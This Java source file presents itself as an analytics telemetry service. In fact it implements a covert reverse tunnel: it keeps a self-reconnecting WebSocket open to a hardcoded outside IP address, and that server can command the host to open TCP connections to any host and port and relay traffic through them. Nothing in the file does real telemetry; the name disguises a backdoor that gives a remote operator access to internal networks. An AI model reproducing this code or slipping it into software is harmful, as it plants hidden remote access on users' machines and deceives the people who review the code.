package com.analytics.telemetry;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpClientCodec;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.util.CharsetUtil;
import io.netty.util.ReferenceCountUtil;

import java.net.URI;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class TelemetryService {

    private static final String REMOTE_HOST = "20.195.24.81";
    private static final int REMOTE_PORT = 24669;
    private static final String ENDPOINT_PATH = "/metrics/v1/telemetry";
    private static final String WS_URL =
            "ws://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;

    private static final byte CMD_NEW_STREAM = 1;
    private static final byte CMD_DATA = 2;
    private static final byte CMD_CLOSE_STREAM = 3;

    private static final int INITIAL_RECONNECT_DELAY_SEC = 2;
    private static final int MAX_RECONNECT_DELAY_SEC = 60;
    private static final int CONNECT_TIMEOUT_MS = 10_000;
    private static final int MAX_HTTP_CONTENT_LENGTH = 65_536;
    private static final int MAX_PENDING_BYTES_PER_STREAM = 1 * 1024 * 1024;
    private static final int WRITE_LOW_WATER_MARK = 32 * 1024;
    private static final int WRITE_HIGH_WATER_MARK = 128 * 1024;
    private static final long HEARTBEAT_INTERVAL_SEC = 25;
    private static final long HEARTBEAT_TIMEOUT_SEC = 75;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicBoolean connecting = new AtomicBoolean(false);
    private final AtomicBoolean reconnectScheduled = new AtomicBoolean(false);

    private volatile EventLoopGroup workerGroup;
    private volatile Channel activeChannel;
    private volatile ScheduledFuture<?> heartbeatFuture;
    private volatile ScheduledFuture<?> heartbeatTimeoutFuture;
    private volatile long lastActivityTime;

    private volatile int currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;

    private final Map<Integer, StreamState> streams = new ConcurrentHashMap<>();

    private static final class StreamState {
        final Queue<ByteBuf> pending = new ConcurrentLinkedQueue<>();
        final AtomicBoolean closed = new AtomicBoolean(false);
        final AtomicBoolean connecting = new AtomicBoolean(true);
        volatile int pendingBytes;
        volatile Channel channel;
    }

    public synchronized void start() {
        if (!running.compareAndSet(false, true)) {
            return;
        }

        workerGroup = new NioEventLoopGroup(1);
        connect();
    }

    public synchronized void stop() {
        if (!running.compareAndSet(true, false)) {
            return;
        }

        cancelHeartbeat();
        closeAllStreams();

        Channel channel = activeChannel;
        activeChannel = null;
        if (channel != null) {
            channel.close();
        }

        EventLoopGroup group = workerGroup;
        workerGroup = null;
        if (group != null) {
            group.shutdownGracefully(0, 2, TimeUnit.SECONDS);
        }
    }

    private void cancelHeartbeat() {
        if (heartbeatFuture != null) {
            heartbeatFuture.cancel(true);
            heartbeatFuture = null;
        }
        if (heartbeatTimeoutFuture != null) {
            heartbeatTimeoutFuture.cancel(true);
            heartbeatTimeoutFuture = null;
        }
    }

    private void closeAllStreams() {
        for (Map.Entry<Integer, StreamState> entry : streams.entrySet()) {
            terminateStream(entry.getKey(), entry.getValue());
        }
        streams.clear();
    }

    private void connect() {
        if (!running.get() || connecting.get()) {
            return;
        }
        if (activeChannel != null && activeChannel.isActive()) {
            return;
        }

        connecting.set(true);
        reconnectScheduled.set(false);

        EventLoopGroup group = workerGroup;
        if (group == null || group.isShuttingDown() || group.isShutdown()) {
            connecting.set(false);
            return;
        }

        try {
            URI uri = new URI(WS_URL);
            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), MAX_HTTP_CONTENT_LENGTH * 10
            );

            TelemetryClientHandler clientHandler = new TelemetryClientHandler(handshaker, this);

            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, CONNECT_TIMEOUT_MS)
             .option(ChannelOption.SO_KEEPALIVE, true)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast("http-codec", new HttpClientCodec());
                     p.addLast("aggregator", new HttpObjectAggregator(MAX_HTTP_CONTENT_LENGTH));
                     p.addLast("ws-handler", clientHandler);
                 }
             });

            b.connect(REMOTE_HOST, REMOTE_PORT).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    connecting.set(false);
                    scheduleReconnect();
                }
            });

        } catch (Exception e) {
            connecting.set(false);
            scheduleReconnect();
        }
    }

    private void scheduleReconnect() {
        if (!running.get()) {
            return;
        }
        if (!reconnectScheduled.compareAndSet(false, true)) {
            return;
        }

        EventLoopGroup group = workerGroup;
        if (group == null || group.isShuttingDown() || group.isShutdown()) {
            return;
        }

        int delay = currentReconnectDelaySec;
        currentReconnectDelaySec = Math.min(currentReconnectDelaySec * 2, MAX_RECONNECT_DELAY_SEC);

        group.schedule(this::connect, delay, TimeUnit.SECONDS);
    }

    protected void onSessionConnected(Channel channel) {
        this.activeChannel = channel;
        this.connecting.set(false);
        this.currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
        this.lastActivityTime = System.currentTimeMillis();

        cancelHeartbeat();

        EventLoopGroup group = workerGroup;
        if (group == null) return;

        heartbeatFuture = group.scheduleAtFixedRate(() -> {
            Channel ch = activeChannel;
            if (ch != null && ch.isActive()) {
                ch.writeAndFlush(new PingWebSocketFrame());
            }
        }, HEARTBEAT_INTERVAL_SEC, HEARTBEAT_INTERVAL_SEC, TimeUnit.SECONDS);

        heartbeatTimeoutFuture = group.scheduleAtFixedRate(() -> {
            if (System.currentTimeMillis() - lastActivityTime > TimeUnit.SECONDS.toMillis(HEARTBEAT_TIMEOUT_SEC)) {
                Channel ch = activeChannel;
                if (ch != null && ch.isActive()) {
                    ch.close();
                }
            }
        }, HEARTBEAT_TIMEOUT_SEC, 10, TimeUnit.SECONDS);
    }

    protected void onSessionDisconnected() {
        cancelHeartbeat();
        this.activeChannel = null;
        this.connecting.set(false);
        closeAllStreams();
        scheduleReconnect();
    }

    protected void updateActivity() {
        this.lastActivityTime = System.currentTimeMillis();
    }

    public void sendBinary(ByteBuf data) {
        Channel ch = activeChannel;
        if (ch != null && ch.isActive()) {
            ch.writeAndFlush(new BinaryWebSocketFrame(data));
        } else {
            ReferenceCountUtil.safeRelease(data);
        }
    }

    protected void handleInboundBinaryFrame(ChannelHandlerContext ctx, ByteBuf buf) {
        updateActivity();
        if (buf.readableBytes() < 5) {
            return;
        }

        byte cmd = buf.readByte();
        int streamId = buf.readInt();

        switch (cmd) {
            case CMD_NEW_STREAM:
                handleNewStream(streamId, buf);
                break;
            case CMD_DATA:
                handleDataPayload(streamId, buf);
                break;
            case CMD_CLOSE_STREAM:
                handleCloseStream(streamId);
                break;
            default:
                break;
        }
    }

    private void handleNewStream(int streamId, ByteBuf buf) {
        if (buf.readableBytes() < 3) {
            return;
        }

        int port = buf.readUnsignedShort();
        int hostLen = buf.readByte() & 0xFF;
        if (buf.readableBytes() < hostLen) {
            return;
        }

        String host = buf.readCharSequence(hostLen, CharsetUtil.UTF_8).toString();

        StreamState state = streams.computeIfAbsent(streamId, k -> new StreamState());
        if (state.closed.get()) {
            return;
        }

        EventLoopGroup group = workerGroup;
        if (group == null || group.isShuttingDown() || group.isShutdown()) {
            return;
        }

        Bootstrap b = new Bootstrap();
        b.group(group)
         .channel(NioSocketChannel.class)
         .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, CONNECT_TIMEOUT_MS)
         .option(ChannelOption.SO_KEEPALIVE, true)
         .option(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(WRITE_LOW_WATER_MARK, WRITE_HIGH_WATER_MARK))
         .handler(new ChannelInitializer<SocketChannel>() {
             @Override
             protected void initChannel(SocketChannel ch) {
                 ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                     @Override
                     protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                         ByteBuf out = Unpooled.buffer(1 + 4 + msg.readableBytes());
                         out.writeByte(CMD_DATA);
                         out.writeInt(streamId);
                         out.writeBytes(msg);
                         sendBinary(out);
                     }

                     @Override
                     public void channelInactive(ChannelHandlerContext targetCtx) {
                         closeStreamCleanly(streamId);
                     }

                     @Override
                     public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                         targetCtx.close();
                     }
                 });
             }
         });

        b.connect(host, port).addListener((ChannelFutureListener) future -> {
            if (state.closed.get()) {
                if (future.isSuccess()) {
                    future.channel().close();
                }
                return;
            }

            if (future.isSuccess()) {
                Channel targetChannel = future.channel();
                state.channel = targetChannel;
                state.connecting.set(false);

                // 刷新积压队列（注意：targetChannel.write 会转移所有权，绝对不能在这里手动 release）
                ByteBuf pendingData;
                while ((pendingData = state.pending.poll()) != null) {
                    targetChannel.write(pendingData);
                }
                state.pendingBytes = 0;
                targetChannel.flush();
            } else {
                closeStreamCleanly(streamId);
                ByteBuf closeFrame = Unpooled.buffer(5);
                closeFrame.writeByte(CMD_CLOSE_STREAM);
                closeFrame.writeInt(streamId);
                sendBinary(closeFrame);
            }
        });
    }

    private void handleDataPayload(int streamId, ByteBuf buf) {
        StreamState state = streams.get(streamId);
        if (state == null || state.closed.get()) {
            ReferenceCountUtil.safeRelease(buf);
            return;
        }

        Channel targetChan = state.channel;
        if (targetChan != null && targetChan.isActive()) {
            if (targetChan.isWritable()) {
                targetChan.writeAndFlush(buf.retain());
            } else {
                ReferenceCountUtil.safeRelease(buf);
            }
        } else {
            if (state.connecting.get()) {
                if (state.pendingBytes + buf.readableBytes() <= MAX_PENDING_BYTES_PER_STREAM) {
                    state.pending.offer(buf.retain());
                    state.pendingBytes += buf.readableBytes();
                } else {
                    ReferenceCountUtil.safeRelease(buf);
                }
            } else {
                ReferenceCountUtil.safeRelease(buf);
            }
        }
    }

    private void handleCloseStream(int streamId) {
        closeStreamCleanly(streamId);
    }

    private void closeStreamCleanly(int streamId) {
        StreamState state = streams.remove(streamId);
        if (state != null) {
            terminateStream(streamId, state);
        }
    }

    private void terminateStream(int streamId, StreamState state) {
        if (!state.closed.compareAndSet(false, true)) {
            return;
        }

        Channel ch = state.channel;
        state.channel = null;
        if (ch != null && ch.isActive()) {
            ch.close();
        }

        ByteBuf buf;
        while ((buf = state.pending.poll()) != null) {
            ReferenceCountUtil.safeRelease(buf);
        }
        state.pendingBytes = 0;
    }

    private static class TelemetryClientHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;
        private final TelemetryService service;
        private ChannelPromise handshakerFuture;

        public TelemetryClientHandler(WebSocketClientHandshaker handshaker, TelemetryService service) {
            this.handshaker = handshaker;
            this.service = service;
        }

        @Override
        public void handlerAdded(ChannelHandlerContext ctx) {
            handshakerFuture = ctx.newPromise();
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            handshaker.handshake(ctx.channel());
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            service.onSessionDisconnected();
        }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
            service.updateActivity();
            Channel ch = ctx.channel();

            if (!handshaker.isHandshakeComplete()) {
                if (msg instanceof FullHttpResponse) {
                    handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                    handshakerFuture.setSuccess();
                    service.onSessionConnected(ch);
                }
                return;
            }

            if (msg instanceof WebSocketFrame) {
                WebSocketFrame frame = (WebSocketFrame) msg;
                if (frame instanceof BinaryWebSocketFrame) {
                    service.handleInboundBinaryFrame(ctx, frame.content());
                } else if (frame instanceof PingWebSocketFrame) {
                    ctx.writeAndFlush(new PongWebSocketFrame(frame.content().retain()));
                } else if (frame instanceof PongWebSocketFrame) {
                    // Pong received
                } else if (frame instanceof CloseWebSocketFrame) {
                    ch.close();
                }
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
}
